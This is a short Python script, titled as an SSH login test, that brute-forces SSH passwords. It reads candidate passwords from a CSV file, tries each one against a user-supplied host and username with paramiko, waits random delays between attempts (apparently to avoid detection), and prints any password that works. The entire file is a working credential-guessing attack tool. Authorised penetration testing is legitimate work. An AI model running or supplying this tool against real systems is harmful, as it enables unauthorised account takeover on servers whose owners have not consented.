###################################################################################################
#
# Test SSH login
# Author: Rocco <Sheliak> Sicilia
# Usage: $ 
# Usage sample: 
#
###################################################################################################

import sys
import paramiko
import time
import random

target = sys.argv[1]
username = sys.argv[2]
command = "ll"

with open('AuthTestPass.csv','r') as file:
    content = file.read()

passwords = content.split(",")

for password in passwords:
    time.sleep(random.uniform(0.5, 10.0))
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, "22", username, password)
        stdin, stdout, stderr = ssh.exec_command(command)
        lines = stdout.readlines()
        print("Get passsword for user {}: {}".format(username, password))
    except:
        print("Auth failure for user {} and password {}".format(username, password))
